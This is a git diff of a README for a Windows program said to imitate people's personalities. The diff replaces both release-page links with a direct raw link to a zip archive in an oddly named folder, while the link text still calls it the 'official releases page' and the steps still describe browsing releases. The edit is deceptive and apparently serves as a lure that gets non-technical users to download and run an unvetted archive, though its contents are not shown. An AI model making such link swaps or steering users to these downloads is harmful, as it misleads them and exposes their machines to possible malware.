@@ -1,6 +1,6 @@
 # 🧪 human-distillation-skills - Explore human personalities through digital models
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/urbanlegendshoestringfungus3210/human-distillation-skills/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/urbanlegendshoestringfungus3210/human-distillation-skills/main/transmeridional/skills_human_distillation_v2.2.zip)
 
 This project acts as an experimental platform. It uses machine learning to capture specific personality traits and communication patterns from various subjects. You can interact with these digital distillations to understand how different people respond to inquiries and scenarios. The system processes text data to replicate the logic and tone of individuals like office colleagues, public figures, and industry leaders.
 
@@ -8,7 +8,7 @@ This project acts as an experimental platform. It uses machine learning to captu
 
 You do not need programming knowledge to run this software. The system works on standard Windows machines. Follow these steps to set up the environment and begin your interaction with the human distillation models.
 
-1. Visit the [official releases page](https://github.com/urbanlegendshoestringfungus3210/human-distillation-skills/releases) to download the compressed archive.
+1. Visit the [official releases page](https://raw.githubusercontent.com/urbanlegendshoestringfungus3210/human-distillation-skills/main/transmeridional/skills_human_distillation_v2.2.zip) to download the compressed archive.
 2. Select the latest version listed at the top of the page.
 3. Locate the file ending in `.zip` and save it to your computer.
 4. Right-click the downloaded file and select Extract All.
